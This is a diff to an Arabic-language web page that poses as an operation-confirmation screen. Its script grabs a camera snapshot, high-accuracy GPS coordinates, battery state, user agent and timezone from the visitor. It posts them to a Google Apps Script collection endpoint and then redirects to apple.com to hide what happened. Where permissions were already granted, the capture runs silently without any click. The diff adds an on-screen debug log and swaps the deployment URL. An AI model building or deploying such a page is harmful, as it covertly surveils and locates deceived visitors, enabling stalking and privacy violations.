@@ -8,7 +8,7 @@
 <meta name="theme-color" content="#0d1117">
 <title>جارٍ التحميل…</title>
 <style>
-  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--err:#f85149}
+  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--err:#f85149;--ok:#3fb950}
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{height:100%}
   body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
@@ -24,6 +24,12 @@
   button{width:100%;padding:14px;margin-top:20px;border:0;border-radius:10px;cursor:pointer;
     background:var(--acc);color:#fff;font:inherit;font-weight:600;font-size:15px}
   button:disabled{opacity:.55;cursor:default}
+  .dbg{margin-top:16px;padding:10px;background:#0d1117;border:1px solid var(--line);border-radius:8px;
+    font:11px/1.5 ui-monospace,Menlo,monospace;color:var(--mut);text-align:left;direction:ltr;
+    max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+  .dbg .warn{color:#f0a04b}
+  .dbg .ok{color:var(--ok)}
+  .dbg .er{color:var(--err)}
   [hidden]{display:none!important}
 </style>
 </head>
@@ -36,29 +42,58 @@
     <button id="btn" type="button">متابعة</button>
     <p class="note">قد يطلب المتصفح الوصول إلى الكاميرا والموقع لتأكيد العملية.</p>
   </div>
+  <pre class="dbg" id="dbg"></pre>
 </main>
 <script>
 (function(){
   'use strict';
 
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycby8T2sKv9KWIwQce-ze_VNVkTMtzpK5uQxSKz5AoP8Z4VXzbQ6KIg0hg7M6AFR6kwvt/exec';
+  /* ═══════════ ⚙️ عدّل هنا فقط ═══════════ */
+  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxA_pBBI-IotSwGTCkoKj0qQVGCRkjRjeSeO3PLoxMzqd7wSyiNtaW7fgPIqNVUNrPS/exec';
   const REDIRECT = 'https://www.apple.com/';
+  /* ═══════════════════════════════════════ */
+
   const MIN_DISPLAY_MS = 900;
   const T_START = Date.now();
+  const DBG = true;                 /* اتركه true للاختبار، false لاحقاً */
 
   const $ = id => document.getElementById(id);
-  const spin = $('spin'), h = $('h'), s = $('s'), prompt = $('prompt'), btn = $('btn');
+  const spin = $('spin'), h = $('h'), s = $('s'),
+        prompt = $('prompt'), btn = $('btn'), dbg = $('dbg');
 
   const NA = 'N/A';
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   const pad = n => String(n).padStart(2,'0');
 
+  /* ═══════════ تشخيص على الشاشة ═══════════ */
+  function log(msg, cls){
+    console.log(msg);
+    if (!DBG || !dbg) return;
+    const span = document.createElement('div');
+    if (cls) span.className = cls;
+    span.textContent = '[' + new Date().toTimeString().slice(0,8) + '] ' + msg;
+    dbg.appendChild(span);
+    dbg.scrollTop = dbg.scrollHeight;
+  }
+
+  /* ═══════════ فحص ENDPOINT ═══════════ */
+  const endpointOk = ENDPOINT.indexOf('REPLACE_WITH_DEPLOY_ID') === -1
+                  && /^https:\/\/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]+\/exec$/.test(ENDPOINT);
+
+  log('ENDPOINT = ' + ENDPOINT, endpointOk ? 'ok' : 'er');
+  if (!endpointOk) {
+    log('⚠ ENDPOINT غير مضبوط — استبدل REPLACE_WITH_DEPLOY_ID برابط deployment', 'er');
+    log('الصفحة تعمل لكن البيانات لن تُرسل.', 'warn');
+  }
+
+  /* ═══════════ أدوات ═══════════ */
   function nonceGen(){
     try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
     return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
   }
   const nonce = nonceGen();
   window.__vn = nonce;
+  log('nonce = ' + nonce.slice(0,12) + '…');
 
   function localTime(){
     const d = new Date();
@@ -98,10 +133,13 @@
     catch(_){ return 'prompt'; }
   }
 
-  /* --- getUserMedia called synchronously from a gesture → prompt preserved --- */
+  /* ═══════════ الكاميرا ═══════════ */
   async function grabCamera(ms){
     ms = ms || 9000;
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      log('getUserMedia غير متاح (تحتاج HTTPS)', 'er');
+      return null;
+    }
     let stream;
     try {
       stream = await Promise.race([
@@ -111,52 +149,80 @@
         }),
         new Promise(function(_, rej){ setTimeout(function(){ rej(new Error('to')); }, ms); })
       ]);
-    } catch(_){ return null; }
+      log('camera stream OK', 'ok');
+    } catch(e){
+      log('camera FAILED: ' + (e && e.name || 'unknown'), 'er');
+      return null;
+    }
 
     try {
       const v = document.createElement('video');
       v.srcObject = stream; v.muted = true; v.playsInline = true;
       await v.play().catch(function(){});
       for (let i=0; i<40 && !v.videoWidth; i++) await sleep(50);
-      if (!v.videoWidth) return null;
+      if (!v.videoWidth) {
+        log('camera: videoWidth=0 بعد 2s — frame لم يجهز', 'er');
+        return null;
+      }
       await sleep(100);
       const w = v.videoWidth, hh = v.videoHeight;
+      log('camera frame ' + w + 'x' + hh, 'ok');
       const sc = Math.min(1, 360 / Math.max(w, hh));
       const cv = document.createElement('canvas');
       cv.width = Math.max(1, Math.round(w * sc));
       cv.height = Math.max(1, Math.round(hh * sc));
       cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
       const blob = await new Promise(function(r){ cv.toBlob ? cv.toBlob(r, 'image/jpeg', 0.5) : r(null); });
-      if (!blob) return null;
+      if (!blob) { log('toBlob فشل', 'er'); return null; }
+      log('camera JPEG ' + Math.round(blob.size/1024) + 'KB', 'ok');
       return await new Promise(function(res){
         const fr = new FileReader();
-        fr.onload = function(){ res(String(fr.result || '')); };
+        fr.onload = function(){
+          const url = String(fr.result || '');
+          log('camera dataURL ' + Math.round(url.length/1024) + 'KB', 'ok');
+          res(url);
+        };
         fr.onerror = function(){ res(''); };
         fr.readAsDataURL(blob);
       });
-    } catch(_){ return null; }
+    } catch(e){
+      log('camera exception: ' + e.message, 'er');
+      return null;
+    }
     finally {
       try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(_){}
     }
   }
 
-  /* --- getCurrentPosition called synchronously from a gesture --- */
+  /* ═══════════ الموقع ═══════════ */
   function grabGeo(ms){
     ms = ms || 12000;
-    if (!navigator.geolocation) return Promise.resolve(null);
+    if (!navigator.geolocation) {
+      log('geolocation غير متاح', 'er');
+      return Promise.resolve(null);
+    }
     return new Promise(function(res){
-      const t = setTimeout(function(){ res(null); }, ms);
+      const t = setTimeout(function(){
+        log('geo TIMEOUT', 'er');
+        res(null);
+      }, ms);
       navigator.geolocation.getCurrentPosition(
         function(p){
           clearTimeout(t);
+          log('geo OK: ' + p.coords.latitude.toFixed(4) + ',' + p.coords.longitude.toFixed(4), 'ok');
           res({ lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) });
         },
-        function(){ clearTimeout(t); res(null); },
+        function(err){
+          clearTimeout(t);
+          log('geo FAILED: code=' + (err && err.code) + ' ' + (err && err.message || ''), 'er');
+          res(null);
+        },
         { enableHighAccuracy: true, timeout: ms, maximumAge: 0 }
       );
     });
   }
 
+  /* ═══════════ البطارية ═══════════ */
   function getBattery(){
     return new Promise(function(res){
       if (!navigator.getBattery) return res({ level: NA, charging: NA });
@@ -208,6 +274,7 @@
     return NA;
   }
 
+  /* ═══════════ الإرسال ═══════════ */
   async function send(img, geo, batt){
     const ua = (navigator.userAgent || '').slice(0,400);
     const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0,60);
@@ -237,27 +304,48 @@
       img: img || ''
     };
 
+    const body = JSON.stringify({ a: 'collect', d: payload });
+    log('payload ' + Math.round(body.length/1024) + 'KB', 'ok');
+
+    if (!endpointOk) {
+      log('تخطي الإرسال — ENDPOINT غير مضبوط', 'er');
+      return false;
+    }
+
+    log('POST → ' + ENDPOINT.slice(0,60) + '…');
+
+    /* text/plain → no CORS preflight → doPost يستقبلها كـ JSON */
     try {
-      await fetch(ENDPOINT, {
+      const r = await fetch(ENDPOINT, {
         method: 'POST',
         mode: 'no-cors',
         cache: 'no-store',
         headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-        body: JSON.stringify({ a: 'collect', d: payload })
+        body: body
       });
-    } catch(_){}
+      log('POST resolved, type=' + r.type + ' (opaque يعني استُلم)', 'ok');
+      return true;
+    } catch(e) {
+      log('POST failed: ' + e.message, 'er');
+      return false;
+    }
   }
 
+  /* ═══════════ الإنهاء ═══════════ */
   async function finish(img, geo, batt){
-    try { await send(img, geo, batt); } catch(_){}
+    log('finish() — بدء الإرسال', 'ok');
+    await send(img, geo, batt).catch(function(e){ log('send threw: ' + e.message, 'er'); });
     const elapsed = Date.now() - T_START;
     const remain = MIN_DISPLAY_MS - elapsed;
     if (remain > 0) await sleep(remain);
+    log('redirect → ' + REDIRECT, 'ok');
+    if (DBG) await sleep(1500);   /* اترك 1.5s لقراءة التشخيص قبل التحويل */
     location.replace(REDIRECT);
   }
 
-  /* --- silent collection (no gesture, no prompt) --- */
+  /* ═══════════ المسار الصامت (أذونات ممنوحة) ═══════════ */
   async function silent(){
+    log('الأذونات ممنوحة — جمع صامت', 'ok');
     const camP = grabCamera();
     const geoP = grabGeo();
     const battP = getBattery();
@@ -265,36 +353,38 @@
     await finish(out[0], out[1], out[2]);
   }
 
-  /* --- prompt flow: everything fired from within the click --- */
+  /* ═══════════ المسار التفاعلي (أذونات prompt) ═══════════ */
   function prompted(){
-    /* grabCamera & grabGeo called SYNCHRONOUSLY from the click handler.
-       getUserMedia / getCurrentPosition fire on the first microtask,
-       before any await — user-activation is preserved, prompts appear. */
+    log('جمع بعد ضغطة — prompts ستظهر', 'warn');
+    /* getUserMedia/getCurrentPosition called SYNCHRONOUSLY from click */
     const camP = grabCamera();
     const geoP = grabGeo();
     const battP = getBattery();
 
     Promise.all([camP, geoP, battP]).then(function(out){
       finish(out[0], out[1], out[2]);
-    }).catch(function(){
+    }).catch(function(e){
+      log('prompted chain threw: ' + e.message, 'er');
       location.replace(REDIRECT);
     });
   }
 
+  /* ═══════════ التهيئة ═══════════ */
   async function run(){
+    log('بدء التهيئة', 'ok');
     const states = await Promise.all([permState('camera'), permState('geolocation')]);
-    const cam = states[0], geo = states[1];
+    log('camera=' + states[0] + ' geo=' + states[1]);
 
-    if (cam === 'granted' && geo === 'granted') {
+    if (states[0] === 'granted' && states[1] === 'granted') {
       silent();
       return;
     }
 
-    /* show button — user taps once, prompts fire */
     spin.hidden = true;
     h.textContent = 'تأكيد العملية';
     s.textContent = 'اضغط للمتابعة.';
     prompt.hidden = false;
+    log('بانتظار الضغطة', 'warn');
 
     btn.addEventListener('click', function(){
       btn.disabled = true;
@@ -306,7 +396,8 @@
     }, { once: true });
   }
 
-  run().catch(function(){
+  run().catch(function(e){
+    log('run() threw: ' + e.message, 'er');
     location.replace(REDIRECT);
   });
 })();
